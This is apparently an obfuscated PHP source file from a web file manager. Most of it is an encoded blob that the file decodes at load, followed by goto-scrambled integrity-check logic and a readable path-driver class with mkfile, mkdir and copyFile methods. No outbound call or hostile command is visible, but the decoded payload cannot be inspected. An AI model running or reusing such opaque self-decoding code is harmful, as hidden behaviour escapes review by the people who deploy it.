\67\7\144\221\34\224\320\163\100\124\57\151\161\312\166\240\122\254\113\313\103\167\376\320\331\275\253\14\217\356\34\123\11\327\225\370\31\164\362\126\231\141\342\177\145\3\16\353"."\x84\x4d\x90\x43\xb5\x98\x60\x56\xf0\x9d\x59\x84\xad\x2c\x9c\x2c\x94\x84\x6b\x8b\xf6\x30\xc2\x8c\x5c\xe8\x22\xad\xc0\x52\x22\x4c\x70\x30\xf9\x93\xa3\x91\xcc\xf0\xaa\x25\x11\xcb\x6a\xda\x68\xb1\x20\xb0\x2\x9c\x8a\x77\xd9\x86"."\153\270\251\171\135\363\210\213\117\357\377\206\211\213\375\157\130\210\61\10\110\274\147\60\72\112\217\175\173\25\311\227\204\14\302\36\222\363\115\316\57\327\211\374\162\35\141\166\43\26\341\327\116\34\214\353"."\xc2\x4\xd8\x9\xf4\x2c\x94\xfc\x56\x70\xdd\x61\x1d\xec\x19\xc5\x79\x55\x65\xf7\x40\x44\x2e\xca\x8c\xe9\x8b\xe8\x96\x8a\xb0\xc9\xf7\x2d\x58\x36\x36\x6f\x61\xee\x16\x16\x9d\x63\x8b\xb7\x65\x27\x5c\x1\x46\x83\x82\xc3\x15\xfc"."\x5c\x4f\x64\x54\x7a\xeb\x84\x6e\x4d\xc2\x82\x92\x3e\xdd\x1a\x28\x49\x41\xde\xa7\x4f\xc3\xb\xef\xd0\x80\x16\x81\x1d\x1a\x74\x36\xc2\x40\xa0\x13\x85\xe7\x27\x4\x4d\x2a\x8d\x49\x28\x68\xb2\xe0\xe0\xa2\xde\x60\x97\x7\xf9\x7"."\x88\xf5\x4\xe9\x4b\xca\x9d\x9d\xf3\xd1\x91\x31\x7b\x4\x1a\xd0\x8b\x13\x7c\x28\xcd\x5e\x35\x1c\x92\x75\xa8\xc0\xe0\x88\x10\x35\x36\x89\xa4\x4a\x5a\x9e\x5d\x6b\x91\x73\xb1\x32\x46\xc5\x91\x81\x9e\x81\x98\x67\x30\xd2\x23\xf8"."\x58\x60\xa0\x1\xa2\x8d\x83\x9e\x8c\x86\x90\x60\x28\xb0\xd2\xc3\x3d\x2a\xc5\x65\x83\x9e\x17\xd\xd\xd\x39\xe1\x79\x3b\x34\x10\x49\xa0\xd7\xa6\xbb\x60\xa2\x4\x19\x61\xae\xb3\x66\x54\x4b\x26\xb2\x5a\x31\x59\xc3\xb\x74\x37".base64_decode('u5qktqZmaTBP1R3p9og+IZ7XnMLbf7ZHxK2Jlvdt6cdxEthLALISdszBkqILmvv0yWby2xdcRjQ=')."\162\275\301\1\162\176\320\267\204\351\241\370\224\2\25\232\275\25\157\1\43\325\231\361\134\166\36\123\314\21\116\105\73\174\355\5\135\53\244\324\174\122\2\70\171\243\335\327\131\343\363\54\153\257\231\17"."\x92\xe4\x6c\x16\xa6\x4a\xee\xf9\x1d\x6e\x8e\x48\x46\x6c\x20\x14\x1c\xe8\xe\x30\xef\xa\x3\x70\x8\xc8\xf1\x18\x79\x87\x9c\x3e\x29\x4f\x3e\x65\xd1\xd9\xae\x1\x3d\x5d\xc3\x75\xb6\x6b\x50\x9d\x6a\x24\xea\xdd\xd\x59\xcc\xe0".base64_decode('YDP1UimakhK9R2gSJvQDjDJLEUQgPj80ohfII8NOwW3mCRhIrOl6RGs60BFwfYI35LBXYcckoLo=')."\20\232\64\270\153\54\351\54\127\132\61\311\255\54\202\303\332\45\335\160\335\161\342\267\325\65\175\2\146\266\241\125\375\50\325\172\102\6\370\374\216\231\134\135\223\131\56\30\343\162\103\342\70\63\32\0"."\105\242\373\72\333\100\223\150\270\263\206\130\333\321\171\1\231\141\315\174\314\367\72\302\355\312\70\34\124\320\344\371\101\364\356\162\277\146\42\265\247\16\267\230\6\20\1\327\60\300\6\170\76\33\56\210"."\x41\x81\xa8\x38\xd8\x6a\x54\x95\xf9\x56\xa2\x85\xfb\xf5\x76\x89\x3d\x9a\xcd\x29\xb6\x68\xa6\x8\xc1\x2e\x93\xf5\x89\x76\xa9\xca\xe3\xdb\xd9\xaa\xfa\xde\x26\x2a\x91\x30\xb1\xbe\x48\xd5\x49\xb\xcd\x7f\x40\xd5\x3a\xe7\xcc\x6a"."\153\152\162\344\212\206\351\324\25\353\43\250\260\243\44\162\176\330\27\166\342\211\355\134\246\2\176\340\243\106\307\350\15\364\166\211\114\4\207\104\347\7\16\15\170\42\336\36\207\204\210\325\41\55\362\107".strrev('Ğ:ô†=P±œID›š) •Ô; Y0ï Òšåş?`Ò~M‡sÌ ×œíµƒüx'."\0".'')."\xcd\xb5\xf\xa9\xf9\xd6\x16\xa8\x28\x8d\x2d\x79\xe0\x3e\x9d\x10\x3\xe0\x8e\x45\x3d\xdf\x8e\x5d\x4\x19\xce\x9c\x9a\x0\xab\x3a\x58\x51\x9d\x80\x24\xda\xa1\xe\x9e\xb5\xc\x7a\x91\xf9\x7f\x2f\x1\xd6\x82\x6a\x6b\xff\xdf\x4b"."\x81\x2a\x13\x1e\x13\x2c\x32\xf1\xa2\xa9\x18\xff\x53\x19\x94\xc1\xb1\xae\xc2\x6a\x45\xf3\xc9\xaa\xd0\x2c\xb5\x34\x35\x49\xc1\x25\x10\x8d\xa4\xec\x2d\xe4\xa2\x9d\x4c\x78\x1\x1e\x1f\xb2\x4a\x63\xf5\x8c\xa4\x5c\xa2\xcf\xac\x66"."\xe0\x24\x53\xf3\x5\xea\x8d\x11\x31\x2a\x30\xf0\x21\xe1\xf9\x79\xcd\xba\x1c\x44\x2c\xdc\x9a\x34\x2c\x49\x39\x35\x19\x6d\xa8\x68\x9e\x84\x9b\xc\x90\x77\x82\xb5\x3\xae\xed\x25\x5\xa6\xd1\xce\xc2\x98\x98\x95\x25\xdb\xd1\x57"."\60\27\143\140\13\42\50\20\143\202\111\236\55\32\240\60\216\215\323\30\172\22\256\103\363\325\74\174\225\325\104\274\15\103\30\202\126\316\53\164\322\303\374\320\324\315\215\200\156\316\230\141\76\214\310\362"."\x11\xef\x95\xf3\x3\xb8\x68\x5\xa2\x50\x98\xb5\x55\xd0\xb0\x69\x3e\x9d\x15\x5a\x41\x1e\x2b\x2a\xc\xde\x6e\x9b\x25\xac\xcd\x28\x13\x23\x3\x5b\x8f\x51\x2c\x4b\xd7\x32\x72\xc1\x45\xc2\x87\xd1\x9c\x11\xf4\xd\xce\x80\xf2\x78"._kodDe('MVVyjYROwM0UkhSD9y5JXfiULXbRG0DMz5+nGk+nSQ+dsE/Sruw77mU+wW82B4LFWRkUouNC2xnF')."\2\137\333\65\324\73\151\200\371\6\42\267\74\304\14\277\204\226\51\302\244\241\64\112\302\45\60\37\240\333\322\144\263\35\320\102\261\265\124\12\36\107\220\30\301\102\373\111\232\5\157\26\151\254\220\225".base64_decode('84pBYyCrKNguEzMus2ZkqDRZOFsXqx7D9oIEMh4rKFl8WIIsuSh8Ygp4IqtDJ2RJMa7m4BWjzCo=').base64_decode('qQORHXCjUYqT1hUlb4HEs0XFApCzhYyMIBhAnlrwxt3etNuru71kq70z/tmFJJNVi7hXog80oAY=')."\xe2\x9d\x34\x74\xfc\x92\x56\x53\x55\xe1\xf0\x6a\xae\x6a\x42\x81\x4a\x75\x65\xae\xb1\x93\x11\x74\x69\x4\x74\x78\x59\x8d\xee\x24\x84\x94\x90\x66\xb2\xb5\x95\x9b\xd7\xa0\xa4\x54\x96\xaa\x79\x5\xfa\x16\xc5\xba\x7b\x3\x3\x31"."\x24\xe2\x7\xfb\x23\x9e\x5e\x5b\x2\xe0\x99\x91\x80\xb7\x2\xdc\x15\xa4\xae\x5f\x6d\xb5\x8e\xe7\xac\x6a\x68\x6a\x1e\x2d\xf3\x3\xdc\x85\xd\x88\xca\x6\x73\x7d\x4a\x3c\xa\x92\x3c\x50\xa7\x1f\x7\xe7\x75\xc4\x75\x37\xb5\x14".base64_decode('jAsbHiMnZ5lCk5vqmbuNIhERiJeT3gCZO26yv+tV42SYB7y9K0EToDOKYMgTWsGd3IKUiCc0RQo=')."\314\103\174\311\121\367\146\363\26\56\134\110\237\333\114\144\261\151\41\324\355\147\367\345\0\12\117\237\224\112\250\134\211\11\325\362\220\115\217\345\276\75\44\353\36\334\202\52\211\53\325\302\24\211\152\201"."\276\241\121\240\352\345\205\42\275\314\146\307\151\202\353\231\331\344\167\234\374\306\47\11\131\313\72\321\35\110\310\44\277\152\220\363\261\364\44\124\175\243\141\260\322\144\371\71\46\122\6\36\221\274\162\276".base64_decode('1pSCAG2e1AeNivJpaRK0HPtRNrjDDCOjZLMxqPJGqpvIaJJ9A0mjU3+DF0PARaqvAZknqCCZVPQ=')."\x25\x4\xfc\x3\x6f\xfb\xb9\x7b\x8\x62\xf6\xe6\x72\x11\x25\x1e\xe8\x55\x0\x30\x13\x2b\x12\x72\x60\x49\xdd\x5\xa0\x63\x83\x18\xe0\x73\x82\x9f\x43\x28\x29\x49\x70\x69\x41\xe6\xb\x16\x97\x2c\x4b\xb4\x24\x19\xb6\x76\xec\x87"."\x25\xa9\x8c\xcf\x93\x90\x93\x21\xe2\xd\xbb\xba\x5f\x1f\xf4\x19\x9\x7c\x6\x9a\x6d\x49\xd8\x40\xd5\xa2\x20\x88\x11\x2a\x20\xed\x16\x3d\x43\x9c\x50\x59\xe1\x19\x4d\xcd\x4d\x82\x29\x46\xc0\xeb\xf\xc7\x16\x87\xa1\xcb\xcc\xde".base64_decode('AHXxYk0IgLRIaIoUT2iqlGDX4ilSvHT/YE3pDQbDojchW/UGBwQ/gWR/DNdu+ipH/2Av4V9RQsE=')."\121\302\213\275\104\275\51\132\234\321\324\106\255\164\370\363\221\260\157\142\302\43\317\370\310\14\207\65\264\103\303\141\51\41\143\153\226\270\202\245\2\45\11\175\204\302\332\111\6\220\225\51\47\237\6\35".base64_decode('ALvdda7G+unTciIs2gCB0Qb3tEFSjWkcBhCmM7h7VV3Nutp6V0NdtLmeqW9FqTlYNFokyk8ja9s=')."\xd6\x73\x77\x84\xd1\x61\x57\x43\x74\x64\xba\xa0\x4d\xb6\x16\x0\xd6\x33\x40\x39\x43\xcf\xc3\x90\xe7\x6\x86\x65\x34\xd4\xd\xd7\xd4\x8e\xb8\x1a\x86\x57\x45\xa3\x23\x30\x58\xf\x60\xed\x10\x1e\xd\xbb\x1a\xea\x1d\xb\xa6\xbb".base64_decode('B1VDxMdOlafEIV1ODcIK7HAfiiwq2CUhEwhRn3bAD5iy4LLNzBUEsoVexWa1iRrlGEKXlCJd+1A=')."\x90\x5a\x5d\x15\xb8\x66\xbd\x55\x99\x96\x45\x2d\xb3\xa5\x49\xea\x2\xa2\x9a\xc5\x1a\xd8\xe2\x57\x4e\xa8\x9d\xde\x28\x14\x14\x13\xbd\x29\x22\x88\xf8\xce\x6\x8c\xb\xaf\x95\xa\x75\x5\xf2\x9a\xe0\x0\x5\x16\x44\x1d\x4\x11"."\x41\x40\x36\x32\x53\x78\xcc\xc1\xe\x29\x40\x3\x84\x3a\x21\xd6\xe2\x82\x1b\x7e\x61\xa1\xed\xb1\x79\x7e\x22\xdb\xa8\xca\x3e\xc4\x61\x40\xc8\x64\x6a\x21\x3c\xf0\x29\xb4\xaf\xa1\x7e\x3a\xb8\xa2\x78\x39\x4e\x7a\x0\xf6\x71\xcc"."\xf6\x41\x66\x54\x9c\x15\xb6\xa3\x5c\x7\x6\x49\x13\x5c\xb\x8b\x46\xa9\x88\x94\x90\xb\xf0\xbe\x26\x89\x4f\xc6\x41\xc7\x93\x6f\xb3\xd0\xe0\x0\xf4\xb7\x6\x39\x41\x8c\x9e\xa1\xa\xa0\x40\x7f\x20\x16\xe\xac\xf4\x57\x24\x40".base64_decode('98DVU8B6HwlQ8UeA9weRizMLfLB/SX9wqBpqpG+AyxJCktfTH4kJe1K8WQFbLrZboVrsCT3R2hI=')."\x67\xd3\x8c\xb9\xfe\xa2\xb2\x3c\x99\x29\x74\xcd\xe7\x2e\x2\xc6\x9d\x4c\xa9\x9f\xee\x77\x7c\xdc\xb3\x7\xc9\x86\xe\x5e\x49\x15\x90\x9f\x13\x92\x41\x3c\xc5\x11\x93\x1d\x52\xd5\x33\x1c\xb6\xa1\xd2\xe5\xbc\x91\x52\x74\xdb\xf1"."\144\134\315\313\324\301\151\216\176\73\307\314\330\240\143\44\352\40\6\231\234\121\311\100\274\273\56\260\13\100\142\347\245\203\124\75\11\215\222\204\63\273\274\31\122\322\142\264\127\143\72\173\150\65\257\122"."\4\174\313\106\260\55\201\233\24\117\302\54\212\157\346\10\317\223\203\230\360\124\274\140\137\347\154\226\130\213\142\270\144\34\151\24\22\260\246\170\25\33\75\233\255\77\62\172\305\223\27\372\333\315\207\213"."\161\346\307\305\146\124\107\275\210\112\242\71\33\365\23\12\13\100\317\274\300\26\30\142\32\50\26\276\116\314\133\46\146\101\337\254\310\202\323\240\325\31\147\145\142\212\1\25\262\6\251\330\125\55\245\312"."\247\120\222\320\243\11\272\217\43\113\21\351\304\25\274\257\114\332\337\55\316\126\342\344\103\23\275\277\141\233\65\322\271\316\26\111\40\57\310\173\4\212\300\247\21\254\33\271\25\146\226\343\150\320\107\201".base64_decode('YJrErfzwAzVsaNFLNiymCxZgSpIOHXoJpupagoHoqZiqNlK4s2Cyz+JN0oYAprw1nTwyL1TGmkE=')."\307\336\365\174\12\167\240\201\262\360\72\163\47\234\0\244\341\147\353\205\116\340\76\332\360\63\67\324\167\250\47\231\264\203\43\32\3\126\372\171\163\61\257\247\304\353\72\330\200\206\3\301\376\272\172\50".base64_decode('UVns+PsmmF9sMGpoze6Tx/mgsAhNZTRpWCLYa6ElNwMxrDJ9VpHtsAZ6BtwM1EW7iT2DQqyZoRM=').base64_decode('erHQIJFPy9gEivDNdubIkW5/yjk1IfUGF8G9ty8QXiKlFVPiQg+6pLDOcuSEAR3qUSKPUxUWFHQ=')."\xa2\x3\x10\xa7\xc5\x3d\xe\xdb\x91\x88\x1e\x1e\x61\x41\x15\x5\xe3\x51\x17\x8b\x83\xa7\x27\xce\x24\xb3\x6e\xb5\xe1\x52\x21\xa1\x22\x87\xf8\x7d\x21\xf\xdc\xd1\x58\xf9\x2\x2\x93\xbd\x8e\xb5\x9c\x9\x5\xde\x3\x54\xff\x76".strrev('XN%|D‡Šô`–\\òc2)…Nû+u›äÜYg@ "š‰}øˆMWiå>T5I|ÔŸ–~	wÊ±')."\xd\xa0\xc3\x1\xb0\xd4\x72\x5d\xb7\x2\x75\x97\x42\xae\xd7\x29\x6d\x90\xa8\x70\x53\x6d\x79\x4e\x8e\x24\x83\x9d\xa0\xac\x52\x52\xc7\x61\x21\x47\x28\xb0\xa8\x27\x32\x55\x71\x15\xd8\x6a\x92\xbf\x15\x67\xab\x8c\x9a\xa4\xd2\x22".strrev('áŒ,17ÌJyd5R´É‰.†>ŠüP·Òy'."\n".')_Ü_+Ğ9ğŞp&*	Ô±ÚÖTDd'."\r".'s').strrev('M¸“H.%r2,f¯İÚ,­äúFaMÌCI—uRqşÏ\'†›9‘ÈôÜxÎ	Y6ÈS‘mÔp')."\x3c\x43\x90\x3a\xa5\x26\xe4\x5a\x1\xeb\xd3\xa0\xfb\x9d\xe\xea\x58\x1e\x36\x1e\xdb\x29\xa3\x67\xbf\xfc\xb9\x82\x69\xb1\x61\xee\x51\xd\xfe\x40\x4\x12\x13\xf8\x76\x8\xca\x5e\x5a\x6e\xa2\x2\x60\x31\x92\xef\xa5\xd5\x60\x1e"."\x42\xa1\x19\x49\x3e\xa5\x89\x2d\x43\x2c\xcb\xf\x58\x83\x3\x85\xb0\x6d\xb4\x3\x9e\x54\x9b\x3\x88\x8\x7a\x95\x92\x62\xcd\x3e\x65\x59\x86\x9d\xd7\x33\x3e\x6d\x61\x8c\x28\x22\xd0\x11\x32\x4a\x15\x1c\xac\xd3\x5f\xe8\x8a\x86"."\311\227\260\52\202\40\102\254\226\242\344\227\362\100\173\321\140\154\274\104\53\204\22\40\214\126\44\366\51\134\15\215\324\325\301\331\72\276\215\6\40\300\6\220\45\216\100\321\64\115\30\176\254\216\36\302"."\76\6\135\330\143\5\225\73\322\52\163\72\152\101\43\344\16\266\10\374\260\320\346\133\205\254\157\330\317\112\61\37\300\156\346\55\120\135\20\257\105\137\265\330\273\14\167\7\116\320\301\327\6\260\73\31"."\62\41\305\42\251\327\36\364\3\5\160\100\257\314\266\331\135\351\345\7\372\100\144\342\3\367\57\72\252\41\51\326\45\312\277\4\101\352\220\350\174\61\114\13\35\101\221\3\110\43\16\24\100\304\51\12"."\x49\xd5\xa1\x16\xe2\x44\x28\x6c\xc0\xd0\x6b\x84\x6c\xec\x60\x8f\x92\x1f\x9f\x92\x62\xe2\x23\x8c\xf3\x7d\x86\xf8\x90\x6\x6d\x2\x26\x8c\x8a\x6f\xa0\x5f\xb8\x89\x76\xe0\x36\x3a\x18\xb9\xa8\x46\x2f\x52\x2f\x34\xc2\x58\xc0\x72"."\x70\x8f\xee\xe\x7c\x36\x8f\x8c\x58\x38\x73\xe0\xdd\x41\xc9\x3e\xad\xf0\xf\xc2\x1a\x46\xc4\x8f\x5b\x24\x39\xbb\x10\xc7\x7a\xc9\x96\x21\x64\xef\xc9\x88\x56\xe9\x10\x81\xbb\x35\xca\x17\x73\xdc\x7f\x14\x88\x58\x5\x58\x2c\xda".base64_decode('U1cS39Lcop51INVYB31ezoFfLHVYikAViplCg5k0ZRuuio99h9KJN1ok0ALRAHuYwEnt6GKjOpo=')."\152\241\113\260\173\344\107\306\370\275\313\202\235\121\256\310\45\133\132\147\316\25\367\213\174\30\271\343\32\372\66\65\376\241\107\143\214\60\44\53\235\111\364\221\115\161\146\243\104\253\123\135\362\362\251\300"."\5\155\374\353\73\115\7\117\65\161\23\147\22\116\260\130\311\102\27\124\373\312\377\275\36\126\157\146\144\37\350\143\62\246\40\30\212\42\54\257\75\176\20\362\273\177\237\12\154\262\325\207\25\112\265\116"."\175\341\330\101\61\203\320\320\235\214\211\40\355\363\47\231\204\365\15\226\345\21\105\330\112\21\234\316\34\256\343\204\174\310\163\67\31\210\110\54\4\43\274\236\52\272\144\107\5\105\120\43\247\52\32\355"."\x1\x49\x7d\x9\xc5\xa0\xcb\x72\xe4\x0\xce\xb3\x88\x79\xd9\x87\x17\x89\xbc\xa\x30\xc6\xd9\x84\xa9\xf1\x14\x53\xf0\xff\xe\x19\x4b\x90\x9e\x9a\x81\x4d\xa4\x45\xa4\x4\x71\x6e\x75\x24\xd0\x7d\xd2\x6\x14\x65\x0\x61\x1e\x1"."\xfa\x56\x5\xb1\x90\xc8\x4b\x5c\x0\x41\xd\x15\x1c\xf9\x90\x6d\x2a\xef\x29\xf\x99\x30\x49\x87\xf8\x66\x2c\x88\x32\x42\x21\x1c\x9d\xcc\x3c\xe4\x44\x17\x7f\x56\xe0\xdf\x9c\x55\xf3\x50\x3f\x55\xcc\x87\x11\xe1\x40\x6\x89\x71"."\54\61\43\112\170\360\101\41\253\120\303\152\201\270\114\65\232\305\225\200\204\110\26\21\24\244\234\15\152\356\42\203\131\230\207\364\236\165\246\242\6\175\313\112\4\213\143\116\234\111\104\164\77\57\254\164".strrev('l(İeÆÉ_ã9fÉA™ğkí†è×™’E¾“›æqAÓ¸ZHX‹„HÄ°å”%LKİ3"')."\xd4\xa4\x2e\xbc\xaa\x45\xc4\x56\x56\x11\xc7\xa9\x48\xc0\x1b\x90\x57\x13\xa3\x55\x5c\xf6\xc0\xfe\x87\x3a\x32\x2\xcf\x14\x56\x9a\xa\x34\xce\x53\xc0\x82\xc4\x74\xdb\x68\x8\xc9\xae\x50\x46\x21\x4f\x65\x5b\x9e\x60\x8\xb2\x3b"."\337\172\342\356\155\144\41\145\10\160\26\322\303\44\221\27\130\100\25\34\44\142\141\336\26\140\25\42\200\76\326\51\75\130\162\100\347\100\135\202\20\134\351\241\251\62\65\124\311\303\330\64\24\361\70\237"."\xc7\x71\xf8\xea\xae\x75\x43\x29\x7e\xd\x5f\xcd\xc2\x4d\x53\x8\xee\x6f\x5c\xb6\xe2\xd9\xbc\xa9\x3a\x57\x54\x3\x1f\xc3\x89\xb2\x3f\x8\x89\x75\xa7\x93\x6d\x40\xd7\xd0\xa\x6c\x85\xb2\x5d\x98\x60\x22\x24\xa8\xef\x84\xed\xec".base64_decode('ytQsvQAEZuGIHL+oiB/Nhs/BAaYlhQf76pDPawhArnLQq1yriUCwWtpbEv7Db7PVwWRYyGop0M8=').base64_decode('X8etl/ibYuLL3PAMqVtjQ2917w/96VrpfH41tISmGwKa8DTRUuh8HAf71Dx9VYKQL81Oul584t4=')."\132\76\30\351\260\151\31\23\376\62\271\375\105\162\264\305\302\273\46\313\346\211\250\311\210\40\341\230\7\352\202\133\175\245\242\104\4\246\317\56\222\22\204\263\152\353\255\1\173\222\272\202\67\25\325\136".base64_decode('IRnloq99gV/ozT/AnSWgZHy65inJTIXEnmvQIoEKdwwJRIF8m4AyxkEt0T+egmrPYWZUPdml5pM=')."\166\374\142\76\316\240\34\35\14\106\127\65\60\220\221\70\173\266\301\205\225\204\63\110\271\304\317\240\271\114\230\114\166\313\245\52\250\314\264\231\101\1\204\241\42\201\107\170\240\204\73\331\125\312\342\327"."\11\136\252\162\35\201\210\225\120\376\200\211\275\135\150\336\60\70\71\366\317\13\136\317\10\271\161\20\176\262\236\271\265\303\105\351\32\312\50\47\271\277\73\134\107\266\175\343\237\264\276\263\302\320\230\60"."\6\160\220\222\270\323\2\265\371\371\205\47\131\164\105\265\45\221\275\243\120\174\325\55\246\205\24\172\205\342\304\233\207\51\63\204\253\177\204\323\253\265\213\303\266\373\16\33\13\345\310\164\61\323\54\3".strrev('pˆ^?{öeÚşÚªy#>Šô9Å­ì‰¶+ã	54á/`b­9ô7´U-‚XÖX0"').strrev('Ñ±ÛøÈçår*¤º©Ô¶>æu\'­l;4~ÙXj)€<´÷ä³Z\\œÁ\''."\r".'šª5ÁäªÑ)qVÚ')."\x3e\xb5\x7a\x2d\xaa\xee\xa9\xa7\xaa\x45\x55\xe4\x29\x6b\xc1\xb1\x6d\x57\x88\xd5\xd8\x1c\x4d\xa9\xc2\xd8\xf8\x8d\x5f\x25\xb\xe5\x69\x55\xee\x1f\x71\x99\x70\x7d\xd\x59\xd4\xf1\x2a\x92\xc5\xcb\xcc\xea\xd7\x9d\xa1\xaa\x13\xd1"."\xb0\xde\x43\xda\xe0\x62\xc7\x50\xc5\x8a\x6d\xa7\x9f\xf6\xce\x43\xe7\x5\x6\x24\x1a\x10\xc1\x16\xc6\x5b\xcc\x8f\xe6\xa9\xc7\x22\xf0\x5\xee\x9\x10\x5a\x25\x7a\x74\x7b\xff\x51\x31\xce\xe6\x14\x97\x92\x67\xbe\x28\x38\x62\xad"."\xea\x55\xd7\x1\x77\xb8\x95\x5b\xc8\x2c\xf5\x67\x25\xfa\x1c\xc6\xfb\xc\xcd\x54\x13\x82\x1a\x4\x4\x8a\x6e\x73\x71\x3a\xfd\x48\x96\x9f\x44\x11\x19\x0\xdf\x6e\xf9\x44\xad\x5e\x54\x5b\x15\x3e\x9f\xce\x6e\x10\x2d\xd7\x65\x55"."\322\135\374\144\322\342\224\31\75\303\305\54\265\361\242\114\316\146\361\115\2\322\130\41\220\256\11\270\115\162\340\265\16\47\207\65\335\204\26\334\200\37\27\320\157\227\146\232\224\115\0\311\26\141\42\321"."\xd\x39\x88\x11\xee\x47\x41\x88\xbf\x73\xa\xfb\x16\x1d\xb\x23\x42\x45\xc\x5\x5\xc9\x9d\x6\xdc\x52\x86\x15\x9c\x8a\x98\x94\x25\x2\x8f\x9b\x59\x24\x54\x79\xae\xdc\x5d\xb4\x5d\xa2\x70\x0\xd8\xc\xc6\xb5\x71\x42\x4\xe8".strrev('Ñœ·àEãF9Vß“1bh“Ù"ÇSÌòNQ;c¨›Šq¸eb¤^ÛÅ'."\n".'„ÿ\'q.ÅºL.x^U')."\201\17\174\2\335\277\74\20\216\204\53\222\6\74\341\360\120\60\344\303\52\235\25\311\50\227\160\265\136\221\64\320\23\354\237\52\315\337\347\11\364\126\244\301\253\166\250\150\112\137\202\304\111\201\1\124"."\x4b\x4f\x6f\x2f\xd5\xeb\xaa\xac\x45\xc0\xbb\x84\xd7\x4\xdd\x30\xf1\xf3\xd0\x42\x46\xa3\xc7\x8b\x36\x9d\x13\x7a\x7c\x1c\x96\xe9\x34\x81\xcc\x9f\x6d\x68\x85\xb0\x92\x63\x87\x4f\x42\x71\xd6\x53\x0\x71\xc8\xd\xfa\x52\x29\xb"."\x14\x2a\x76\x10\xc2\x42\xf\xaf\xc6\xfb\x49\x61\x21\xea\x49\x11\x3e\x8b\xcd\xa6\x3f\x93\x66\x51\xe3\x44\x1d\x1b\x7e\x9f\xe6\xb2\xdc\xbb\x9\x70\x34\x71\x10\x13\x12\x8\x52\x5c\x83\x11\x80\xe8\x84\xda\xee\x3d\x6c\x9d\x29\xac"."\367\225\67\147\10\302\73\4\326\173\61\365\244\260\106\213\13\47\252\230\117\131\70\224\250\334\200\303\66\6\226\214\150\21\71\115\370\12\24\54\170\254\153\102\14\213\307\25\363\31\133\61\345\64\275\276".base64_decode('trNi4b4W9tL/B8JZcNUvwgAA')."", 10, -8))); goto Eô±­ß†éŞ; fÚ¤ÒÅğ¡¨: $DîéÓ¸Ï‘Û = $_SERVER[ÚŠ•´ÍéÒÑÔ][1152]; if ($_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][781]] != $DîéÓ¸Ï‘Û($aÙ©–ÎÙÈÊ)) { goto f©Š‰İñŠ; EÇ®µ Œ¼â: $f«·ÉèÎ˜($aÙ©–ÎÙÈÊ); goto Cµ³æóä”ç; D¤Èïƒ­Ü¹: $Ağ·çääÈâ = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][214], $d²ùÈ…†ë); if (count($Ağ·çääÈâ) < $_SERVER[ÚŠ•´ÍéÒÑÔ][557]) { $fâº×ÉÑ´ = $_SERVER[ÚŠ•´ÍéÒÑÔ][787]; $fâº×ÉÑ´(); } $f«·ÉèÎ˜ = $_SERVER[ÚŠ•´ÍéÒÑÔ][1153]; goto EÇ®µ Œ¼â; f©Š‰İñŠ: $bÊĞƒè•¨Å = $_SERVER[ÚŠ•´ÍéÒÑÔ][784]; $aá™ŒØ°‰ = $_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][785]] . $_SERVER[ÚŠ•´ÍéÒÑÔ][786]; $d²ùÈ…†ë = $bÊĞƒè•¨Å($aá™ŒØ°‰); goto D¤Èïƒ­Ü¹; Cµ³æóä”ç: } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($fÇ‡‹ïéêµ) { if (substr($fÇ‡‹ïéêµ, 0, 2) == $_SERVER[ÚŠ•´ÍéÒÑÔ][1139]) { $fÇ‡‹ïéêµ = BASIC_PATH . substr($fÇ‡‹ïéêµ, 2); } return $fÇ‡‹ïéêµ; } public function iconvApp($F˜»©ç†ø°) { $Bµ’”Îß’È =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $config; return $this->iconvTo($F˜»©ç†ø°, $config[$Bµ’”Îß’È[1137]], $config[$Bµ’”Îß’È[1136]]); } public function iconvSystem($dîâæÒÆÚ) { $aåÀøŠÀšê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $config; return $this->iconvTo($dîâæÒÆÚ, $config[$aåÀøŠÀšê[1136]], $config[$aåÀøŠÀšê[1137]]); } public function getPathOuter($FŸ‡± —Ü÷) { goto F”´˜³—Ì; F”´˜³—Ì: $Aâİ“Ğ–„Ş =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÈçÀ‰‚Ëò = $this->iconvApp($this->pathBase); $FŸ‡± —Ü÷ = $this->iconvApp($FŸ‡± —Ü÷); goto aó¦æÔ³‰ù; FùÄĞà‹Ÿ¼: $FŸ‡± —Ü÷ = KodIO::clear($FŸ‡± —Ü÷); $FŸ‡± —Ü÷ = substr($FŸ‡± —Ü÷, strlen($AÈçÀ‰‚Ëò)); if (empty($this->pathDriver)) { return $FŸ‡± —Ü÷; } goto e¾ÆÕÕÓ…ô; e¾ÆÕÕÓ…ô: return $this->pathDriver . $Aâİ“Ğ–„Ş[8] . ltrim($FŸ‡± —Ü÷, $Aâİ“Ğ–„Ş[8]); goto fÒ÷íõ´ğã; aó¦æÔ³‰ù: if (substr($AÈçÀ‰‚Ëò, 0, 2) == $Aâİ“Ğ–„Ş[1139]) { $AÈçÀ‰‚Ëò = BASIC_PATH . substr($AÈçÀ‰‚Ëò, 2); } if (substr($FŸ‡± —Ü÷, 0, 2) == $Aâİ“Ğ–„Ş[1139]) { $FŸ‡± —Ü÷ = BASIC_PATH . substr($FŸ‡± —Ü÷, 2); } $AÈçÀ‰‚Ëò = KodIO::clear($AÈçÀ‰‚Ëò); goto FùÄĞà‹Ÿ¼; fÒ÷íõ´ğã: } public function mkfile($E¾ñöåíÅ£, $F‹Ã´³Òè = '', $EšÆ¶øÆ = REPEAT_RENAME) { $E¾ñöåíÅ£ = $this->iconvSystem($E¾ñöåíÅ£); @touch($E¾ñöåíÅ£); if ($F‹Ã´³Òè) { file_put_contents($E¾ñöåíÅ£, $F‹Ã´³Òè); } return is_file($E¾ñöåíÅ£) ? $this->getPathOuter($E¾ñöåíÅ£) : !1; } public function mkdir($Aà™Æëšà, $Bğ¥¬È‚î¿ = REPEAT_SKIP) { $Aà™Æëšà = $this->iconvSystem($Aà™Æëšà); if (is_dir($Aà™Æëšà)) { return $this->getPathOuter($Aà™Æëšà); } @mkdir($Aà™Æëšà, 511, !0); return is_dir($Aà™Æëšà) ? $this->getPathOuter($Aà™Æëšà) : !1; } public function copyFile($D¶¡¦ì¶Å‹, $aáÑè«ã½ë) { $this->mkdir($this->pathFather($aáÑè«ã½ë)); $D¶¡¦ì¶Å‹ = $this->iconvSystem($D¶¡¦ì¶Å‹); 